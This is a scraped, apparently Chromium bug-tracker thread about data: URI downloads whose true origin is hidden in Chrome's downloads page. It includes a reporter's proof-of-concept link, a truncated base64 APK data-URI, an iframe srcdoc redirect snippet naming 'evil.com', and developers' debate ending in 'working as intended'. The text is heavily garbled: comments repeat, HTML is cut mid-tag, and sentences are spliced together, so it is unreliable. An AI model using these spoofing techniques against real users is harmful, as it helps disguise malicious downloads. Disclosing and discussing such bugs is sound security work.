        Thanks for the follow up. My reading of <span class="line"><!---->Thanks for the follow up. My reading of <!----></span>issue 121259<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=121259" title="Add origin to download shelf"><!---->issue 121259<!----></a> <span class="line"><!----> <!----></span>was as a thread documenting a variety of general concerns about more clearly associating downloads with an accurate origin. Using this broad interpretation there is overlap/duplication. However, I am reassigning this bug to the owners of <span class="line"><!---->was as a thread documenting a variety of general concerns about more clearly associating downloads with an accurate origin. Using this broad interpretation there is overlap/duplication. However, I am reassigning this bug to the owners of <!----></span>issue 1275770<span class="line"><!---->issue 1275770<!----></span> <span class="line"><!----> <!----></span>(view restricted) for their input. <span class="line"><!---->(view restricted) for their input. <!----></span><br><br>@bhatiarohit would your forthcoming work on <span class="line"><!---->@bhatiarohit would your forthcoming work on <!----></span>issue 1275770<span class="line"><!---->issue 1275770<!----></span> <span class="line"><!----> <!----></span>address this issue described above? If so, then this is a duplicate. However, if not then please help us find a good owner for this fix.<span class="line"><!---->address this issue described above? If so, then this is a duplicate. However, if not then please help us find a good owner for this fix.<!----></span><mr-comment-content></mr-comment-content>

          <a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

          
        by

        Hi @qinmin and @bookholt,<span class="line"><!---->Hi @qinmin and @bookholt,<!----></span><br><br>My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<span class="line"><!---->My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<!----></span><br>- application/vnd.android.package-archive (for apk)<span class="line"><!---->- application/vnd.android.package-archive (for apk)<!----></span><br>- application/vnd.microsoft.portable-executable (for exe)<span class="line"><!---->- application/vnd.microsoft.portable-executable (for exe)<!----></span><br>- application/octet-stream (for bin/dmg)<span class="line"><!---->- application/octet-stream (for bin/dmg)<!----></span><br>...<span class="line"><!---->...<!----></span><br><br>And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<span class="line"><!---->And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<!----></span><mr-comment-content></mr-comment-content>

        I am wondering whether this should be something safebrowsing should do instead of download. <span class="line"><!---->I am wondering whether this should be something safebrowsing should do instead of download. <!----></span><br>Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<!----></span><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<span class="line"><!---->If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<!----></span><br><br>As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<span class="line"><!---->As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment#11<a class="undefined" target="_blank" href="#c11"><!---->comment#11<!----></a>:<span class="line"><!---->:<!----></span><br><br>Download already shows a dangerous warning for apk or exe download.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download.<!----></span><br>-------------------------------<span class="line"><!---->-------------------------------<!----></span><br>Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<span class="line"><!---->Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<!----></span><br><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<!----></span><br>-----------------------<span class="line"><!---->-----------------------<!----></span><br>For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<span class="line"><!---->For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment #12<a class="undefined" target="_blank" href="#c12"><!---->comment #12<!----></a>:<span class="line"><!---->:<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too<!----></span><br>--------------------<span class="line"><!---->--------------------<!----></span><br>I couldn't agree more. If a file <span class="line"><!---->I couldn't agree more. If a file <!----></span>"<span class="line"><!---->"<!----></span>twitter.com/botnet_c2/chrome.apk<a class="undefined" target="_blank" href="https://twitter.com/botnet_c2/chrome.apk"><!---->twitter.com/botnet_c2/chrome.apk<!----></a>"<span class="line"><!---->"<!----></span> is judged to be a malicious file by Google safe browsing or VirusTotal, users will be blocked to download from this URL, the creator of botnet could use the data URI to trigger download.<span class="line"><!----> is judged to be a malicious file by Google safe browsing or VirusTotal, users will be blocked to download from this URL, the creator of botnet could use the data URI to trigger download.<!----></span><br><br>So it's a good idea that data URLs with executable MIMIE type(application/xxx) be blocked from downloading, other types of files are probably okay, users cannot execute them directly.<span class="line"><!---->So it's a good idea that data URLs with executable MIMIE type(application/xxx) be blocked from downloading, other types of files are probably okay, users cannot execute them directly.<!----></span><mr-comment-content></mr-comment-content>

          Comment 15<a class="comment-link" href="?id=1305698#c15">Comment 15<!----></a>

        apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<span class="line"><!---->apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<!----></span><br><br>From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <span class="line"><!---->From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <!----></span>"<span class="line"><!---->"<!----></span>gogle.com<a class="undefined" target="_blank" href="https://gogle.com"><!---->gogle.com<!----></a>", <span class="line"><!---->", <!----></span>"<span class="line"><!---->"<!----></span>g00gle.com<a class="undefined" target="_blank" href="https://g00gle.com"><!---->g00gle.com<!----></a>" to confuse the user, or even using specially encoded "g" or "o" in the URL. So I don't feel blocking data URI will be very helpful here.<span class="line"><!---->" to confuse the user, or even using specially encoded "g" or "o" in the URL. And there is no need to use data URI to trick users.<!----></span><br><br>The dangerous download dialog already presents a warning to users.         Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<span class="line"><!---->Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<!----></span><br> <span class="line"><!----> <!----></span><br>That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<span class="line"><!---->That's why I think this should be done in safe browsing rather than download.           Status:<strong><!---->Status:</strong>

      <div class="issue-diff">

          <strong><!---->Status:</strong>

          (was: Assigned)

        There have been a bunch of ideas suggested by the reporter. I will try to summarize them<span class="line"><!---->There have been a bunch of ideas suggested by the reporter. I will try to summarize them<!----></span><br><br>1) Misleading filename in <span class="line"><!---->1) Misleading filename in <!----></span>#c17<a class="undefined" target="_blank" href="#c17"><!---->#c17<!----></a> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<span class="line"><!----> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<!----></span><br><br>2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <span class="line"><!---->2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <!----></span>issue 594215<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=594215" title="Disable page-initiated main frame navigations to data URLs"><!---->issue 594215<!----></a>. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <span class="line"><!---->. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <!----></span>https://bayden.com/test/data.htm<a class="undefined" target="_blank" href="https://bayden.com/test/data.htm"><!---->https://bayden.com/test/data.htm<!----></a>,<span class="line"><!---->,<!----></span> right click and open a data URI page in a new tab.<span class="line"><!----> right click and open a data URI page in a new tab.<!----></span><br>I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<span class="line"><!---->I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<!----></span><br><br>3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<span class="line"><!---->3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<!----></span><br><br>In light of this discussion, I am marking this bug as working as intended.<span class="line"><!---->In light of this discussion, I am marking this bug as working as intended.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

    <!----></mr-launch-overview>
            </div>
          </div>

website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Google Chrome<span class="line"><!---->Google Chrome<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The problem<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi team,<span class="line"><!---->Hi team,<!----></span><br><br>This is a re-submit of <span class="line"><!---->This is a re-submit of <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>.<span class="line"><!---->.<!----></span><br><br>I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <span class="line"><!---->I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a>.<span class="line"><!---->.<!----></span><br><br><br><br>Reproduce steps:<span class="line"><!---->Reproduce steps:<!----></span><br><br>Visit <span class="line"><!---->Visit <!----></span>https://ybt01.github.io/poc/son.html<a class="undefined" target="_blank" href="https://ybt01.github.io/poc/son.html"><!---->https://ybt01.github.io/poc/son.html<!----></a> and click link on webpage or host the attached poc.html in your own server.<span class="line"><!----> and click link on webpage or host the attached poc.html in your own server.<!----></span><br><br><br><br>The differences:<span class="line"><!---->The differences:<!----></span><br><br>1)#121259 means an attacker could spoof a file download dialog on any domains like<span class="line"><!---->1)#121259 means an attacker could spoof a file download dialog on any domains like<!----></span> <span class="line"><!----> <!----></span>google.com<a class="undefined" target="_blank" href="https://google.com"><!---->google.com<!----></a>, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<span class="line"><!---->, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<!----></span><br><br>I just want to make the attack scenario more real, so I used window.open("<span class="line"><!---->I just want to make the attack scenario more real, so I used window.open("<!----></span>https://abc.xyz<a class="undefined" target="_blank" href="https://abc.xyz"><!---->https://abc.xyz<!----></a>")<span class="line"><!---->")<!----></span> in my <span class="line"><!----> in my <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>'s PoC, the root cause of #1305184 has no relation with #121259.<span class="line"><!---->'s PoC, the root cause of #1305184 has no relation with #121259.<!----></span><br><br><br>2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<span class="line"><!---->2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<!----></span><br>For example:<span class="line"><!---->For example:<!----></span><br>```<span class="line"><!---->```<!----></span><br><a href="data:text/html,xxx">click me</a> //this will be blocked<span class="line"><!---->&lt;a href="data:text/html,xxx"&gt;click me&lt;/a&gt; //this will be blocked<!----></span><br>```<span class="line"><!---->```<!----></span><br>But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<span class="line"><!---->But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<!----></span><br><br>3)My <span class="line"><!---->3)My <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data <!----></span>issues <span class="line"><!---->issues <!----></span>#1213350<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1213350" title="Security: Incorrect Security UI in downloads"><!---->#1213350<!----></a> and <span class="line"><!----> and <!----></span>#1157743<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1157743" title="Security: spoof download on any websites"><!---->#1157743<!----></a>.<span class="line"><!---->.<!----></span><br><br>#1213350: chrome show origin "about:srcdoc" instead of the real origin "<span href="http://evil.com"><!---->http://evil.com<!----></a>"<span class="line"><!---->"<!----></span><br>```<span class="line"><!---->```<!----></span><br><iframe srcdoc="<script>document.location='<span "http:s//ybt01.github.io"<span class="line"><!---->#1305184: chrome show origin "data:..." instead of the real origin "http:s//ybt01.github.io"<!----></span><br>```<span                    application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml&gt;click me&lt;/a&gt;<!----></span><br>```<span data:application/vnd.android.package-archive, application/gz and the like.<span class="line"><!---->- #1305184 need block navigate top frame to data:application/vnd.android.package-archive, application/gz and the like.<!----></span><br>- Show the real origin "<span class="line"><!---->- Show the real origin "<!----></span>https://ybt01.github.io<a class="undefined" target="_blank" /chrome/browser/download/android/download_manager_service.cc <span class="line"><!----> instead "data:..." in chrome://downloads page, the patch location maybe at         Hi @qinmin and @bookholt,<span class="line"><!---->Hi @qinmin and @bookholt,<!----></span><br><br>My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<span class="line"><!---->My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<!----></span><br>- application/vnd.android.package-archive (for apk)<span class="line"><!---->- application/vnd.android.package-archive (for apk)<!----></span><br>- application/vnd.microsoft.portable-executable (for exe)<span class="line"><!---->- application/vnd.microsoft.portable-executable (for exe)<!----></span><br>- application/octet-stream (for bin/dmg)<span class="line"><!---->- application/octet-stream (for bin/dmg)<!----></span><br>...<span class="line"><!---->...<!----></span><br><br>And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<span class="line"><!---->And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<!----></span><mr-comment-content></mr-comment-content>

        I am wondering whether this should be something safebrowsing should do instead of download. <span class="line"><!---->I am wondering whether this should be something safebrowsing should do instead of download. <!----></span><br>Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<!----></span><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<span class="line"><!---->If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<!----></span><br><br>As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<span class="line"><!---->As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment#11<a class="undefined" target="_blank" href="#c11"><!---->comment#11<!----></a>:<span class="line"><!---->:<!----></span><br><br>Download already shows a dangerous warning for apk or exe download.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download.<!----></span><br>-------------------------------<span class="line"><!---->-------------------------------<!----></span><br>Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<span class="line"><!---->Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<!----></span><br><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<!----></span><br>-----------------------<span class="line"><!---->-----------------------<!----></span><br>For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<span class="line"><!---->For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<!----></span><mr-comment-content></mr-comment-content>
        
          
            
      
        
          
          google_play_apk.png<b><!---->google_play_apk.png<!----></b>

        For <span class="line"><!---->For <!----></span>comment #12<a class="undefined" target="_blank" href="#c12"><!---->comment #12<!----></a>:<span class="line"><!---->:<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too<!----></span><br>--------------------<span class="line"><!---->--------------------<!----></span><br>I couldn't agree more. If a file <span class="line"><!---->I couldn't agree more. If a file <!----></span>"<span class="line"><!---->"<!----></span>twitter.com/botnet_c2/chrome.apk<a class="undefined" target="_blank" href="https://twitter.com/botnet_c2/chrome.apk"><!---->twitter.com/botnet_c2/chrome.apk<!----></a>"<span class="line"><!---->"<!----></span> is judged to be a malicious file by Google safe browsing or VirusTotal, users will be blocked to download from this URL, the creator of botnet could use the data URI to trigger download.<span class="line"><!----> is judged to be a malicious file by Google safe browsing or VirusTotal, users will be blocked to download from this URL, the creator of botnet could use the data URI to trigger download.<!----></span><br><br>So it's a good idea that data URLs with executable MIMIE type(application/xxx) be blocked from downloading, other types of files are probably okay, users cannot execute them directly.<span class="line"><!---->So it's a good idea that data URLs with executable MIMIE type(application/xxx) be blocked from downloading, other types of files are probably okay, users cannot execute them directly.<!----></span><mr-comment-content></mr-comment-content>

        apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<span class="line"><!---->apk is an openable file type, so users could open it from notification and from download message, I don't think download page is the main entry point.<!----></span><br><br>From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <span class="line"><!---->From attackers point of view,  using a data URI would not be easier compared to just using a link with URL like <!----></span>"<span class="line"><!---->"<!----></span>gogle.com<a class="undefined" target="_blank" href="https://gogle.com"><!---->gogle.com<!----></a>", <span class="line"><!---->", <!----></span>"<span class="line"><!---->"<!----></span>g00gle.com<a class="undefined" target="_blank" href="https://g00gle.com"><!---->g00gle.com<!----></a>" to confuse the user, or even using specially encoded "g" or "o" in the URL. So I don't feel blocking data URI will be very helpful here.<span class="line"><!---->" to confuse the user, or even using specially encoded "g" or "o" in the URL. So I don't feel blocking data URI will be very helpful here.<!----></span><mr-comment-content></mr-comment-content>

        Regarding #17, as I said, blocking data URI download doesn't make user safer:<span class="line"><!---->Regarding #17, as I said, blocking data URI download doesn't make user safer:<!----></span><br>1. most users don't go to download home to launch apk.<span class="line"><!---->1. most users don't go to download home to launch apk.<!----></span><br>2. Attacker can host the apk on a URL starting with <span class="line"><!---->2. Attacker can host the apk on a URL starting with <!----></span>"<span class="line"><!---->"<!----></span>googIe.com<a class="undefined" target="_blank" href="https://googIe.com"><!---->googIe.com<!----></a>" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<span class="line"><!---->" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<!----></span><br><br>The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<span class="line"><!---->The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<!----></span><mr-comment-content></mr-comment-content>

        I don't agree with that.<span class="line"><!---->I don't agree with that.<!----></span><br><br>1. most users don't go to download home to launch apk.<span class="line"><!---->1. most users don't go to download home to launch apk.<!----></span><br>----------------------<span class="line"><!---->----------------------<!----></span><br>For product security, we should pay attention to every details instead of speculation and experience.<span class="line"><!---->For product security, we should pay attention to every details instead of speculation and experience.<!----></span><br><br>If you can 100% confirm that all users don't go to download home to launch apk, I also agree with that this issue is meaningless.<span class="line"><!---->If you can 100% confirm that all users don't go to download home to launch apk, I also agree with that this issue is meaningless.<!----></span><br><br><br>2.Attacker can host the apk on a URL starting with <span class="line"><!---->2.Attacker can host the apk on a URL starting with <!----></span>"<span class="line"><!---->"<!----></span>googIe.com<a class="undefined" target="_blank" href="https://googIe.com"><!---->googIe.com<!----></a>" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<span class="line"><!---->" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<!----></span><br>----------------<span class="line"><!---->----------------<!----></span><br><br>If so, many of the previous fixed spoof cases are meaningless, such as: #881675, <span class="line"><!---->If so, many of the previous fixed spoof cases are meaningless, such as: #881675, spoof cases.<!----></span><br><br>Why I don't use the simple domain <span class="line"><!---->Why I don't use the simple domain <!----></span>"<span class="line"><!---->"<!----></span>googie.com<a         Personally I think download scanning or download URL checking are much safer than blocking.         There have been a bunch of ideas suggested by the reporter. I will try to summarize them<span class="line"><!---->There have been a bunch of ideas suggested by the reporter. I will try to summarize them<!----></span><br><br>1) Misleading filename in <span class="line"><!---->1) Misleading filename in <!----></span>#c17<a class="undefined" target="_blank" href="#c17"><!---->#c17<!----></a> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<span class="line"><!----> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<!----></span><br><br>2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <span class="line"><!---->2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <!----></span>issue 594215<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=594215" title="Disable page-initiated main frame navigations to data URLs"><!---->issue 594215<!----></a>. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <span class="line"><!---->. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <!----></span>https://bayden.com/test/data.htm<a class="undefined" target="_blank" href="https://bayden.com/test/data.htm"><!---->https://bayden.com/test/data.htm<!----></a>,<span class="line"><!---->,<!----></span> right click and open a data URI page in a new tab.<span class="line"><!----> right click and open a data URI page in a new tab.<!----></span><br>I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<span class="line"><!---->I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<!----></span><br><br>3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<span class="line"><!---->3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<!----></span><br><br>In light of this discussion, I am marking this bug as working as intended.<span class="line"><!---->In light of this discussion, I am marking this bug as working as intended.<!----></span><mr-comment-content></mr-comment-content>

        </div>

      ---<span class="line"><!---->---<!----></span><br><br>### Report description<span class="line"><!---->### Report description<!----></span><br><br><br>Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<span class="line"><!---->Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Google Chrome<span class="line"><!---->Google Chrome<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The problem<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi team,<span class="line"><!---->Hi team,<!----></span><br><br>This is a re-submit of <span class="line"><!---->This is a re-submit of <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>.<span class="line"><!---->.<!----></span><br><br>I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <span class="line"><!---->I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a>.<span class="line"><!---->.<!----></span><br><br><br><br>Reproduce steps:<span class="line"><!---->Reproduce steps:<!----></span><br><br>Visit <span class="line"><!---->Visit <!----></span>https://ybt01.github.io/poc/son.html<a class="undefined" target="_blank" href="https://ybt01.github.io/poc/son.html"><!---->https://ybt01.github.io/poc/son.html<!----></a> and click link on webpage or host the attached poc.html in your own server.<span class="line"><!----> and click link on webpage or host the attached poc.html in your own server.<!----></span><br><br><br><br>The differences:<span class="line"><!---->The differences:<!----></span><br><br>1)#121259 means an attacker could spoof a file download dialog on any domains like<span class="line"><!---->1)#121259 means an attacker could spoof a file download dialog on any domains like<!----></span> <span class="line"><!----> <!----></span>google.com<a class="undefined" target="_blank" href="https://google.com"><!---->google.com<!----></a>, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<span class="line"><!---->, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<!----></span><br><br>I just want to make the attack scenario more real, so I used window.open("<span class="line"><!---->I just want to make the attack scenario more real, so I used window.open("<!----></span>https://abc.xyz<a class="undefined" target="_blank" href="https://abc.xyz"><!---->https://abc.xyz<!----></a>")<span class="line"><!---->")<!----></span> in my <span class="line"><!----> in my <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>'s PoC, the root cause of #1305184 has no relation with #121259.<span class="line"><!---->'s PoC, the root cause of #1305184 has no relation with #121259.<!----></span><br><br><br>2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<span class="line"><!---->2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<!----></span><br>For example:<span class="line"><!---->For example:<!----></span><br>```<span class="line"><!---->```<!----></span><br><a href="data:text/html,xxx">click me</a> //this will be blocked<span class="line"><!---->&lt;a href="data:text/html,xxx"&gt;click me&lt;/a&gt; //this will be blocked<!----></span><br>```<span class="line"><!---->```<!----></span><br>But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<span class="line"><!---->But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<!----></span><br><br>3)My <span class="line"><!---->3)My <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a> <span class="line"><!----> <!----></span>has the same principle with my previous fixed <span class="line"><!---->has the same principle with my previous fixed <!----></span>issues <span class="line"><!---->issues <!----></span>#1213350<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1213350" title="Security: Incorrect Security UI in downloads"><!---->#1213350<!----></a> and <span 